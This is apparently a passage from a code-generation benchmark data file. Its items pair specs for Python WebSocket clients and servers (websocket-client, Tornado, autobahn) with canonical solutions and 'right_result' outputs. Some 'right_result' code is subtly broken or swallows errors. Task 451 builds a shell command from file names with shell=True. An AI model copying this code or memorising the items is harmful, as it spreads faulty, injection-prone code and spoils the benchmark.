    "Canonical_solution": "import os\nimport sys\nimport json\nimport threading\nimport websocket\nimport sublime\n\nclass Protocol:\n    \"\"\"Encapsulate websocket connection\"\"\"\n\n    def __init__(self):\n        self.next_id = 0\n        self.commands = {}\n        self.notifications = {}\n\n    def connect(self, url, on_open=None, on_close=None):\n        \"\"\"Attempt to connect to the web socket\"\"\"\n        self.url = url\n        self.on_open = on_open\n        self.on_close = on_close\n        thread = threading.Thread(target=self.thread_callback)\n        thread.start()\n\n    def thread_callback(self):\n        \"\"\"Threadproc owning the socket.\n           Sets up the callbacks for open, close, and message.\n        \"\"\"\n        self.socket = websocket.WebSocketApp(\n            self.url,\n            on_message=self.message_callback,\n            on_open=self.open_callback,\n            on_close=self.close_callback\n        )\n        self.socket.run_forever()\n\n    def send(self, command, callback=None, options=None):\n        \"\"\"Send to web socket, with optional callback and options\"\"\"\n        command.id = self.next_id\n        command.callback = callback\n        command.options = options\n        self.commands[command.id] = command\n        self.next_id += 1\n        self.socket.send(json.dumps(command.request))\n\n    def subscribe(self, notification, callback):\n        \"\"\"Subscribe to notification with callback\"\"\"\n        notification.callback = callback\n        self.notifications[notification.name] = notification\n\n    def unsubscribe(self, notification):\n        \"\"\"Unsubscribe to notification\"\"\"\n        del self.notifications[notification.name]\n\n    def message_callback(self, ws, message):\n        \"\"\"Callback on any incoming packet.\n           Parse it and call matching callback.\n        \"\"\"\n        parsed = json.loads(message)\n        if 'method' in parsed:\n            if parsed['method'] in self.notifications:\n                notification = self.notifications[parsed['method']]\n                data = notification.parser(parsed['params']) if 'params' in parsed else None\n                self.to_main_thread(notification.callback, (data, notification))\n        else:\n            if parsed['id'] in self.commands:\n                command = self.commands[parsed['id']]\n                del self.commands[parsed['id']]\n                if 'error' in parsed:\n                    self.to_main_thread(print, (\"Error from debuggee: \" + parsed['error']['message'],))\n                else:\n                    command.data = command.parser(parsed['result']) if 'result' in parsed else None\n                    if command.callback:\n                        self.to_main_thread(command.callback, (command,))\n\n    def open_callback(self, ws):\n        if self.on_open:\n            self.to_main_thread(self.on_open, ())\n        print('SWI: WebSocket opened')\n\n    def close_callback(self, ws):\n        if self.on_close:\n            self.to_main_thread(self.on_close, ())\n        print('SWI: WebSocket closed')\n\n    def to_main_thread(self, f, args):\n        \"\"\"Call back on the main thread\n           to simplify the called code\n        \"\"\"\n        if f:\n            sublime.set_timeout(lambda: f(*args))",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "right_result": "import threading\nimport json\nimport uuid\nfrom collections import defaultdict\nfrom websocket import WebSocketApp\n\nclass Protocol:\n    def __init__(self):\n        self.next_id = 0\n        self.commands = {}\n        self.notifications = defaultdict(list)\n        self.url = None\n        self.on_open = None\n        self.on_close = None\n        self.socket = None\n\n    def connect(self, url, on_open=None, on_close=None):\n        self.url = url\n        self.on_open = on_open\n        self.on_close = on_close\n        thread = threading.Thread(target=self.thread_callback)\n        thread.daemon = True\n        thread.start()\n\n    def thread_callback(self):\n        self.socket = WebSocketApp(\n            self.url,\n            on_message=self.message_callback,\n            on_open=self.open_callback,\n            on_close=self.close_callback\n        )\n        self.socket.run_forever()\n\n    def send(self, command, callback=None, options=None):\n        cmd_id = str(uuid.uuid4())\n        self.commands[cmd_id] = callback\n        payload = {\n            'id': cmd_id,\n            'command': command\n        }\n        if options:\n            payload['options'] = options\n        self.socket.send(json.dumps(payload))\n\n    def subscribe(self, notification, callback):\n        self.notifications[notification].append(callback)\n\n    def unsubscribe(self, notification):\n        if notification in self.notifications:\n            del self.notifications[notification]\n\n    def message_callback(self, ws, message):\n        try:\n            data = json.loads(message)\n            cmd_id = data.get('id')\n            if 'result' in data or 'error' in data:\n                if cmd_id in self.commands:\n                    callback = self.commands.pop(cmd_id)\n                    if callback:\n                        self.to_main_thread(callback, (data.get('result'), data.get('error')))\n            elif 'notification' in data:\n                notif_name = data['notification']\n                for callback in self.notifications.get(notif_name, []):\n                    self.to_main_thread(callback, (data.get('data'),))\n        except Exception as e:\n            pass\n\n    def open_callback(self, ws):\n        if self.on_open:\n            self.to_main_thread(self.on_open, ())\n\n    def close_callback(self, ws):\n        if self.on_close:\n            self.to_main_thread(self.on_close, ())\n\n    def to_main_thread(self, f, args):\n        threading.main_thread().join(0.01)\n        if f:\n            f(*args)"
  },
  {
    "Task_id": 443,
    "Instruction": "Task Description: Implement a WebSocket client class for chat applications that handles connection, message sending/receiving, and error events with proper threading and queue management.\n\nClass Description: ChatWebSocket is a WebSocket client implementation that manages WebSocket connections for chat applications. It handles message sending/receiving, connection events, and errors while maintaining thread safety through queue-based message processing.\n\nAttributes:\n- _parent: [weakref.ref] - Weak reference to the parent object to avoid circular references\n- ws: [WebSocketApp] - The WebSocket client instance\n- _inQueue: [Queue] - Thread-safe queue for outgoing messages\n- sendThread: [Thread] - Thread for processing outgoing messages\n\nMethods:\n- __init__(parent) -> None - Initializes the WebSocket client with a parent reference and starts the send thread\n- parent() -> object - Property that dereferences the weakref to the parent object\n- Stop() -> None - Stops the send thread by putting an empty string in the queue\n- SendDataRun() -> None - Thread target function that processes messages from the queue\n- _SendData(data) -> None - Internal method for sending data and emitting appropriate events\n- _Send(msg) -> None - Internal method for sending raw WebSocket messages\n- Send(data) -> None - Public method to queue data for sending\n- on_message(ws, message) -> None - Callback for received WebSocket messages\n- on_error(ws, error) -> None - Callback for WebSocket errors\n- on_close(ws) -> None - Callback for WebSocket connection close\n- on_open(ws) -> None - Callback for WebSocket connection open\n- Start(url) -> None - Starts the WebSocket connection on the specified URL\n- Close() -> None - Closes the WebSocket connection",
    "Canonical_solution": "import threading\nimport weakref\nfrom queue import Queue\nimport websocket\n\nclass ChatWebSocket:\n    def __init__(self, parent):\n        self._parent = weakref.ref(parent)\n        self.ws = None\n        self._inQueue = Queue()\n        self.sendThread = threading.Thread(target=self.SendDataRun)\n        self.sendThread.setName(\"ChatSendThread\")\n        self.sendThread.setDaemon(True)\n        self.sendThread.start()\n\n    @property\n    def parent(self):\n        return self._parent()\n\n    def Stop(self):\n        self._inQueue.put(\"\")\n\n    def SendDataRun(self):\n        while True:\n            task = self._inQueue.get(True)\n            self._inQueue.task_done()\n            try:\n                if task == \"\":\n                    break\n                self._SendData(task)\n            except Exception as es:\n                pass\n\n    def _SendData(self, data):\n        self._Send(data)\n        if \"send_image\" in data:\n            self.parent.websocket.emit(self.parent.SendImg, data)\n        else:\n            self.parent.websocket.emit(self.parent.SendMsg2, data)\n\n    def _Send(self, msg):\n        try:\n            if self.ws:\n                self.ws.send(msg)\n        except Exception as es:\n            pass\n\n    def Send(self, data):\n        self._inQueue.put(data)\n\n    def on_message(self, ws, message):\n        self.parent.websocket.emit(self.parent.Msg, message)\n\n    def on_error(self, ws, error):\n        self.parent.websocket.emit(self.parent.ErrorMsg, str(error))\n\n    def on_close(self, ws):\n        self.parent.websocket.emit(self.parent.Leave, \"\")\n\n    def on_open(self, ws):\n        self.parent.websocket.emit(self.parent.Enter, \"\")\n\n    def Start(self, url):\n        url = url.replace(\"https\", \"wss\").replace(\"http\", \"ws\") + \"/socket.io/?EIO=3&transport=websocket\"\n        def Run():\n            ws = websocket.WebSocketApp(url,\n                                      on_open=self.on_open,\n                                      on_message=self.on_message,\n                                      on_error=self.on_error,\n                                      on_close=self.on_close)\n            self.ws = ws\n            ws.run_forever(ping_interval=30)\n\n        thread = threading.Thread(target=Run)\n        thread.setDaemon(True)\n        thread.start()\n\n    def Close(self):\n        if self.ws:\n            self.ws.close()\n            self.ws = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "right_result": "import threading\nimport queue\nimport weakref\nimport json\nfrom websocket import WebSocketApp\n\nclass ChatWebSocket:\n    def __init__(self, parent):\n        self._parent = weakref.ref(parent)\n        self.ws = None\n        self._inQueue = queue.Queue()\n        self.sendThread = threading.Thread(target=self.SendDataRun, daemon=True)\n        self.sendThread.start()\n\n    @property\n    def parent(self):\n        return self._parent()\n\n    def Stop(self):\n        self._inQueue.put(\"\")\n\n    def SendDataRun(self):\n        while True:\n            try:\n                data = self._inQueue.get()\n                if data == \"\":\n                    break\n                self._SendData(data)\n                self._inQueue.task_done()\n            except Exception as e:\n                if self.parent:\n                    self.parent.on_connection_error(e)\n                break\n\n    def _SendData(self, data):\n        try:\n            self._Send(json.dumps(data))\n            if self.parent:\n                self.parent.on_message_sent(data)\n        except Exception as e:\n            if self.parent:\n                self.parent.on_send_error(e)\n\n    def _Send(self, msg):\n        if self.ws and hasattr(self.ws, 'send'):\n            self.ws.send(msg)\n\n    def Send(self, data):\n        self._inQueue.put(data)\n\n    def on_message(self, ws, message):\n        try:\n            data = json.loads(message)\n            if self.parent:\n                self.parent.on_receive(data)\n        except json.JSONDecodeError:\n            if self.parent:\n                self.parent.on_receive_raw(message)\n\n    def on_error(self, ws, error):\n        if self.parent:\n            self.parent.on_connection_error(error)\n\n    def on_close(self, ws):\n        if self.parent:\n            self.parent.on_disconnect()\n\n    def on_open(self, ws):\n        if self.parent:\n            self.parent.on_connect()\n\n    def Start(self, url):\n        self.ws = WebSocketApp(url,\n                              on_message=self.on_message,\n                              on_error=self.on_error,\n                              on_close=self.on_close,\n                              on_open=self.on_open)\n        self.ws.run_forever()\n\n    def Close(self):\n        if self.ws:\n            self.ws.close()\n        self.Stop()"
  },
  {
    "Task_id": 448,
    "Instruction": "Task Description: Implement a WebSocket server using Tornado in Python that handles WebSocket connections, processes incoming messages, and manages connection lifecycle events.\n\nClass Description: WebSocketServer is a class that sets up a Tornado WebSocket server with an echo handler that sends received messages back to the client.\n\nAttributes:\n- close_future: [Future] - A Future object used to track when the WebSocket connection is closed.\n- app: [Application] - The Tornado web application instance that routes WebSocket connections.\n\nMethods:\n- __init__: [__init__]() -> [None] - Initializes the WebSocket server, creates the Application instance, and sets up the echo handler route.\n- get_app: [get_app]() -> [Application] - Returns the Tornado web application instance.\n- ws_connect: [ws_connect](path: str, **kwargs: dict) -> [WebSocketClientConnection] - Establishes a WebSocket connection to the specified path with optional connection parameters.\n\nClass Description: TestWebSocketHandler is a base WebSocket handler class that provides common functionality for WebSocket connections.\n\nAttributes:\n- close_future: [Future] - A Future object used to signal when the connection is closed.\n- compression_options: [dict] - Options for WebSocket compression.\n\nMethods:\n- initialize: [initialize](close_future: Future = None, compression_options: dict = None) -> [None] - Initializes the handler with optional close_future and compression_options.\n- get_compression_options: [get_compression_options]() -> [dict] - Returns the compression options for the WebSocket connection.\n- on_close: [on_close]() -> [None] - Called when the WebSocket connection is closed; resolves the close_future if it exists.\n\nClass Description: EchoHandler is a WebSocket handler that echoes received messages back to the client.\n\nMethods:\n- on_message: [on_message](message: str or bytes) -> [None] - Handles incoming WebSocket messages and echoes them back to the client. Handles cancellation and closed connection errors gracefully.",
    "Canonical_solution": "from tornado.websocket import WebSocketHandler\nfrom tornado.web import Application\nfrom tornado.concurrent import Future\nfrom tornado import gen\n\nclass TestWebSocketHandler(WebSocketHandler):\n    def initialize(self, close_future=None, compression_options=None):\n        self.close_future = close_future\n        self.compression_options = compression_options\n\n    def get_compression_options(self):\n        return self.compression_options\n\n    def on_close(self):\n        if self.close_future is not None:\n            self.close_future.set_result((self.close_code, self.close_reason))\n\nclass EchoHandler(TestWebSocketHandler):\n    @gen.coroutine\n    def on_message(self, message):\n        try:\n            yield self.write_message(message, isinstance(message, bytes))\n        except asyncio.CancelledError:\n            pass\n        except WebSocketClosedError:\n            pass\n\nclass WebSocketServer:\n    def __init__(self):\n        self.close_future = Future()\n        self.app = Application([\n            (\"/echo\", EchoHandler, dict(close_future=self.close_future))\n        ])\n\n    def get_app(self):\n        return self.app\n\n    @gen.coroutine\n    def ws_connect(self, path, **kwargs):\n        ws = yield websocket_connect(\n            \"ws://127.0.0.1:%d%s\" % (self.get_http_port(), path), **kwargs\n        )\n        raise gen.Return(ws)",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport tornado.websocket\nfrom concurrent.futures import Future\nfrom typing import Optional, Dict, Any\n\nclass TestWebSocketHandler(tornado.websocket.WebSocketHandler):\n    def __init__(self, application: tornado.web.Application, request: tornado.httputil.HTTPServerRequest, **kwargs: Any):\n        super().__init__(application, request, **kwargs)\n        self.close_future: Optional[Future] = None\n        self.compression_options: Optional[Dict] = None\n\n    def initialize(self, close_future: Optional[Future] = None, compression_options: Optional[Dict] = None) -> None:\n        self.close_future = close_future\n        self.compression_options = compression_options\n\n    def get_compression_options(self) -> Optional[Dict]:\n        return self.compression_options\n\n    def on_close(self) -> None:\n        if self.close_future is not None and not self.close_future.done():\n            self.close_future.set_result(None)\n\n\nclass EchoHandler(TestWebSocketHandler):\n    def on_message(self, message: str) -> None:\n        try:\n            self.write_message(message)\n        except tornado.websocket.WebSocketClosedError:\n            if self.close_future is not None and not self.close_future.done():\n                self.close_future.set_exception(Exception(\"Connection closed\"))\n        except Exception as e:\n            if self.close_future is not None and not self.close_future.done():\n                self.close_future.set_exception(e)\n\n\nclass WebSocketServer:\n    def __init__(self):\n        self.close_future = Future()\n        self.app = tornado.web.Application([\n            (r\"/ws\", EchoHandler, dict(close_future=self.close_future)),\n        ])\n\n    def get_app(self) -> tornado.web.Application:\n        return self.app\n\n    def ws_connect(self, path: str, **kwargs: Any) -> tornado.websocket.WebSocketClientConnection:\n        url = f\"ws://localhost:8888{path}\"\n        return tornado.websocket.connect(url, **kwargs)"
  },
  {
    "Task_id": 449,
    "Instruction": "Task Description: Implement a WebSocket server using Tornado in Python to handle real-time communication between clients and the server. The server should manage WebSocket connections, handle incoming messages, and broadcast messages to all connected clients.\n\nClass Description: The WebServer class encapsulates the functionality to start a Tornado-based WebSocket server, manage client connections, and publish messages to all connected clients.\n\nAttributes:\n- path: str - The base path for the WebSocket endpoint.\n- port: int - The port number on which the server will listen (default is 8080).\n- application: tornado.web.Application - The Tornado application instance that handles WebSocket routes.\n- _server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the application.\n\nMethods:\n- __init__(path, port=8080) -> None - Initializes the WebServer instance with the specified path and port. Sets up the Tornado application and initializes the list of WebSocket handlers.\n- start() -> None - Starts the Tornado HTTP server and begins listening for WebSocket connections on the specified port. This method blocks and runs the Tornado I/O loop.\n- publish(message) -> None - Broadcasts the given message to all connected WebSocket clients. The message should be a string or JSON-serializable object.",
    "Canonical_solution": "import tornado.websocket\nimport tornado.web\nimport logging\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        if self not in self.application._socketHandlers:\n            self.application._socketHandlers.append(self)\n\n    def on_close(self):\n        if self in self.application._socketHandlers:\n            self.application._socketHandlers.remove(self)\n\n    def on_message(self, msg):\n        pass\n\nclass WebServer:\n    def __init__(self, path, port=8080):\n        self.path = path\n        self.port = port\n        self.application = tornado.web.Application([\n            (r'/_cactus/ws', WebSocketHandler),\n        ])\n        self.application._socketHandlers = []\n\n    def start(self):\n        self._server = tornado.httpserver.HTTPServer(self.application)\n        self._server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()\n\n    def publish(self, message):\n        for ws in self.application._socketHandlers:\n            ws.write_message(message)",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport tornado.websocket\nimport json\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    clients = set()\n\n    def open(self):\n        self.clients.add(self)\n\n    def on_close(self):\n        self.clients.remove(self)\n\n    @classmethod\n    def send_to_all(cls, message):\n        for client in cls.clients:\n            client.write_message(message)\n\nclass WebServer:\n    def __init__(self, path, port=8080):\n        self.path = path\n        self.port = port\n        self.handlers = [ (path, WebSocketHandler) ]\n        self.application = tornado.web.Application(self.handlers)\n        self._server = None\n\n    def start(self):\n        self._server = self.application.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n\n    def publish(self, message):\n        if isinstance(message, (dict, list)):\n            message = json.dumps(message)\n        WebSocketHandler.send_to_all(message)"
  },
  {
    "Task_id": 450,
    "Instruction": "Task Description: Create a WebSocket server using Tornado in Python to handle WebSocket connections, messages, and disconnections.\n\nClass Description: The WebSocketServer class initializes and starts a Tornado-based WebSocket server that listens on a specified port. It uses a WebSocketHandler to manage individual WebSocket connections.\n\nAttributes:\n- port: int - The port number on which the WebSocket server will listen.\n- app: tornado.web.Application - The Tornado application instance that routes WebSocket connections.\n- server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the WebSocket application.\n\nMethods:\n- __init__(port: int = 8080) -> None - Initializes the WebSocketServer with the specified port (default: 8080).\n- start() -> None - Starts the WebSocket server and begins listening for incoming connections.\n\nClass Description: The WebSocketHandler class extends tornado.websocket.WebSocketHandler to handle WebSocket connection events.\n\nMethods:\n- open() -> None - Called when a new WebSocket connection is opened.\n- on_message(msg: str) -> None - Called when a message is received from the WebSocket client.\n- on_close() -> None - Called when the WebSocket connection is closed.\n- check_origin(origin: str) -> bool - Overrides the origin check to allow connections from any origin (returns True).",
    "Canonical_solution": "import tornado.websocket\nimport tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        print('opened')\n\n    def on_message(self, msg):\n        print('onmessage', msg)\n\n    def on_close(self):\n        print('closed')\n\n    def check_origin(self, origin):\n        return True\n\nclass WebSocketServer:\n    def __init__(self, port=8080):\n        self.port = port\n        self.app = tornado.web.Application([\n            ('.*', WebSocketHandler)\n        ])\n        self.server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self):\n        self.server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport tornado.websocket\nimport tornado.httpserver\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        pass\n\n    def on_message(self, message):\n        pass\n\n    def on_close(self):\n        pass\n\n    def check_origin(self, origin):\n        return True\n\nclass WebSocketServer:\n    def __init__(self, port: int = 8080) -> None:\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/\", WebSocketHandler),\n        ])\n        self.server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self) -> None:\n        self.server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 451,
    "Instruction": "Task Description: Implement a WebSocket server using Tornado in Python to handle real-time communication with clients, including processing video frames and managing participant data.\n\nClass Description: WebSocketHandler is a Tornado WebSocket handler class that manages WebSocket connections, processes incoming messages, and handles the lifecycle of WebSocket connections.\n\nAttributes:\n- None explicitly defined in the class (uses global variables for state management)\n\nMethods:\n- open() -> None - Called when a new WebSocket connection is established. Initializes participant position and calls newParticipant.\n- on_message(message: str) -> None - Handles incoming WebSocket messages. Processes different message types (identified by 'msgID') to manage video frame extraction, data writing to CSV, and frame navigation.\n- on_close() -> None - Called when the WebSocket connection is closed (currently empty implementation).\n- on_error() -> None - Called when an error occurs (not shown in the reference code but typically part of WebSocketHandler).\n\nClass Description: Application is a Tornado web application class that routes WebSocket and static file requests.\n\nAttributes:\n- None explicitly defined (inherits from tornado.web.Application)\n\nMethods:\n- __init__() -> None - Initializes the application with URL handlers for WebSocket connections and static files, and configures template paths.\n\nNote: The reference code also uses several global variables and helper functions (newParticipant, sendVideoEnd, sendVideoFrame, writeDataToCSV, writeScreenCapOutputFrames, closeScreenCapOutVideo) which are not part of the class definitions but are used by the WebSocketHandler methods.",
    "Canonical_solution": "import tornado.websocket\nimport tornado.web\nimport tornado.escape\nimport json\nimport csv\nimport os\nimport glob\nimport numpy as np\nimport subprocess\nimport re\nfrom itertools import chain\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        global_variables.participantPos = -1\n        newParticipant(self)\n\n    def on_message(self, message):\n        msg = tornado.escape.json_decode(message)\n        \n        if msg['msgID'] == '1':\n            global_variables.participant.videosPos += 1\n            pv = global_variables.participant.videos[global_variables.participant.videosPos]\n            video = global_variables.participant.directory + '/' + pv.filename\n            \n            outDir = outputPrefix + video + \"_frames\" + '/'\n            if not os.path.isdir(outDir):\n                os.makedirs(outDir)\n\n            gpCSVDone = outputPrefix + global_variables.participant.directory + '_' + pv.filename + '_' + csvDoneName\n            gpCSV = outputPrefix + global_variables.participant.directory + '_' + pv.filename + '_' + csvTempName\n            \n            if os.path.isfile(gpCSVDone):\n                sendVideoEnd(self)\n                return\n            elif os.path.isfile(gpCSV):\n                os.remove(gpCSV)\n                if writeCSV:\n                    with open(gpCSV, 'w', newline='') as csvfile:\n                        writer = csv.DictWriter(csvfile, fieldnames=fieldnames, delimiter=',', quoting=csv.QUOTE_ALL)\n                        writer.writeheader()\n\n            framesDoneFile = outDir + '/' + \"framesExtracted.txt\"\n            if not os.path.isfile(framesDoneFile):\n                completedProcess = subprocess.run('ffmpeg -i \"./' + video + '\" -vf showinfo \"' + outDir + 'frame_%08d.png\"',\n                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)\n\n                nFrames = len(glob.glob(outDir + '*.png'))\n                if nFrames == 0:\n                    sendVideoEnd(self)\n                    return\n\n                allPts = np.ones(nFrames, dtype=np.int) * -1\n                ptsTimebase = -1\n                framerate = -1\n                lines = completedProcess.stderr.splitlines()\n                for l in lines:\n                    if l.startswith(\"[Parsed_showinfo_0 @\"):\n                        timebase = l.find(\"config in time_base:\")\n                        fr = l.find(\", frame_rate:\")\n                        nStart = l.find(\"n:\")\n                        ptsStart = l.find(\"pts:\")\n                        pts_timeStart = l.find(\"pts_time:\")\n                        if nStart >= 0 and ptsStart >= 0:\n                            frameNum = int(l[nStart+2:ptsStart-1].strip())\n                            pts = int(l[ptsStart+4:pts_timeStart].strip())\n                            allPts[frameNum] = pts\n                        elif timebase >= 0:\n                            ptsTimebase = l[timebase+20:fr].strip()\n                            framerate = l[fr+13:].strip()\n                            sl = framerate.find(\"/\")\n                            if sl > 0:\n                                frPre = framerate[0:sl]\n                                frPost = framerate[sl+1:]\n                                framerate = float(frPre) / float(frPost)\n                            else:\n                                framerate = float(framerate)\n\n                prev = 0\n                for i in range(0, nFrames):\n                    if allPts[i] == -1:\n                        allPts[i] = prev + int(1000/framerate)\n                    prev = allPts[i]\n\n                for i in range(0, nFrames):\n                    inputFile = outDir + frameExtractFormat.format(i+1)\n                    outputFile = outDir + frameOutFormat.format(i, allPts[i])\n                    os.rename(inputFile, outputFile)\n\n                with open(framesDoneFile, 'w') as f:\n                    f.write(\"Done.\")\n\n            pv.frameFilesList = sorted(glob.glob(outDir + '*.png'))\n            pv.frameFilesPos = 0\n            sendVideoFrame(self, pv.frameFilesList[pv.frameFilesPos], pv)\n\n        elif msg['msgID'] == '3':\n            frameTimeEpoch = writeDataToCSV(global_variables.participant, msg)\n\n            if global_variables.writeScreenCapVideo:\n                writeScreenCapOutputFrames(global_variables.participant, frameTimeEpoch)\n\n            pv = global_variables.participant.videos[global_variables.participant.videosPos]\n            pv.frameFilesPos += 1\n\n            if pv.frameFilesPos >= len(pv.frameFilesList):\n                if global_variables.writeScreenCapVideo:\n                    closeScreenCapOutVideo(global_variables.participant)\n\n                gpCSV = outputPrefix + global_variables.participant.directory + '_' + pv.filename + '_' + csvTempName\n                gpCSVDone = outputPrefix + global_variables.participant.directory + '_' + pv.filename + '_' + csvDoneName\n                if os.path.isfile(gpCSV):\n                    os.rename(gpCSV, gpCSVDone)\n\n                sendVideoEnd(self)\n            else:\n                sendVideoFrame(self, pv.frameFilesList[pv.frameFilesPos], pv)\n\n    def on_close(self):\n        pass\n\nclass Application(tornado.web.Application):\n    def __init__(self):\n        handlers = [\n            (r'/websocket', WebSocketHandler),\n            (r'/(.*)', tornado.web.StaticFileHandler, {'path': '.', 'default_filename': ''}),\n        ]\n        settings = {\n            'template_path': 'templates'\n        }\n        tornado.web.Application.__init__(self, handlers, **settings)",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport tornado.websocket\nimport json\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8888, help=\"run on the given port\", type=int)\n\nparticipants = {}\nparticipant_positions = {}\nvideo_frames = {}\nscreen_cap_output = {}\n\ndef newParticipant(participant_id):\n    participants[participant_id] = True\n    print(f\"New participant joined: {participant_id}\")\n\ndef sendVideoEnd(participant_id):\n    message = json.dumps({\"msgID\": \"video_end\", \"participant\": participant_id})\n    if participant_id in WebSocketHandler.connections:\n        WebSocketHandler.connections[participant_id].write_message(message)\n\ndef sendVideoFrame(participant_id, frame_data):\n    message = json.dumps({\"msgID\": \"video_frame\", \"frame\": frame_data})\n    if participant_id in WebSocketHandler.connections:\n        WebSocketHandler.connections[participant_id].write_message(message)\n\ndef writeDataToCSV(participant_id, data):\n    with open(f\"{participant_id}_data.csv\", \"a\") as f:\n        f.write(data + \"\\n\")\n\ndef writeScreenCapOutputFrames(participant_id, frame_data):\n    if participant_id not in screen_cap_output:\n        screen_cap_output[participant_id] = []\n    screen_cap_output[participant_id].append(frame_data)\n\ndef closeScreenCapOutVideo(participant_id):\n    if participant_id in screen_cap_output:\n        # Simulate saving the video\n        print(f\"Closing and saving screen capture for {participant_id}\")\n        del screen_cap_output[participant_id]\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    connections = {}\n\n    def open(self):\n        participant_id = self.get_argument(\"participant\", None)\n        if participant_id:\n            self.connections[participant_id] = self\n            participant_positions[participant_id] = 0\n            newParticipant(participant_id)\n\n    def on_message(self, message):\n        try:\n            msg = json.loads(message)\n            participant_id = msg.get(\"participant\")\n            msg_id = msg.get(\"msgID\")\n\n            if msg_id == \"extracted_frame\":\n                frame_data = msg.get(\"frame\")\n                if participant_id:\n                    sendVideoFrame(participant_id, frame_data)\n                    writeScreenCapOutputFrames(participant_id, frame_data)\n\n            elif msg_id == \"navigate_frame\":\n                direction = msg.get(\"direction\")\n                if participant_id in participant_positions:\n                    if direction == \"next\":\n                        participant_positions[participant_id] += 1\n                    elif direction == \"prev\" and participant_positions[participant_id] > 0:\n                        participant_positions[participant_id] -= 1\n\n            elif msg_id == \"save_data\":\n                data = msg.get(\"data\")\n                if participant_id and data:\n                    writeDataToCSV(participant_id, data)\n\n            elif msg_id == \"end_video\":\n                if participant_id:\n                    sendVideoEnd(participant_id)\n                    closeScreenCapOutVideo(participant_id)\n\n        except json.JSONDecodeError:\n            pass\n\n    def on_close(self):\n        participant_id = self.get_argument(\"participant\", None)\n        if participant_id in self.connections:\n            del self.connections[participant_id]\n        if participant_id in participants:\n            del participants[participant_id]\n        if participant_id in participant_positions:\n            del participant_positions[participant_id]\n\n    def on_error(self):\n        print(f\"WebSocket error occurred: {self._reason}\")\n\nclass Application(tornado.web.Application):\n    def __init__(self):\n        handlers = [\n            (r\"/websocket\", WebSocketHandler),\n            (r\"/(.*)\", tornado.web.StaticFileHandler, {\"path\": \"static\", \"default_filename\": \"index.html\"}),\n        ]\n        settings = {\n            \"template_path\": \"templates\",\n            \"static_path\": \"static\",\n            \"debug\": True,\n        }\n        super().__init__(handlers, **settings)\n\ndef main():\n    options.parse_command_line()\n    app = Application()\n    app.listen(options.port)\n    print(f\"Server started on port {options.port}\")\n    tornado.ioloop.IOLoop.current().start()\n\nif __name__ == \"__main__\":\n    main()"
  },
  {
    "Task_id": 453,
    "Instruction": "Task Description: Create a WebSocket server using autobahn and twisted in Python that handles client connections, messages, and disconnections.\n\nClass Description: WebSocketServer is a class that implements a WebSocket server using autobahn's WebSocketServerProtocol and twisted's reactor pattern. It manages client connections and message exchanges over WebSocket protocol.\n\nAttributes:\n- host: str - The IP address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory that creates protocol instances for each connection\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with specified host and port\n- run() -> None - Starts the WebSocket server and begins listening for connections\n\nNested Class: MyServerProtocol (inherits from WebSocketServerProtocol)\nMethods:\n- onConnect(request) -> None - Called when a client connects (request contains connection details)\n- onOpen() -> None - Called when WebSocket connection is fully established\n- onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received from client (echoes back the same message)\n- onClose(wasClean: bool, code: int, reason: str) -> None - Called when connection is closed",
    "Canonical_solution": "from autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom twisted.internet import reactor\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"Client connecting: {0}\".format(request.peer))\n\n    def onOpen(self):\n        print(\"WebSocket connection open.\")\n\n    def onMessage(self, payload, isBinary):\n        if isBinary:\n            print(\"Binary message received: {0} bytes\".format(len(payload)))\n        else:\n            print(\"Text message received: {0}\".format(payload.decode('utf8')))\n        self.sendMessage(payload, isBinary)\n\n    def onClose(self, wasClean, code, reason):\n        print(\"WebSocket connection closed: {0}\".format(reason))\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = MyServerProtocol\n\n    def run(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
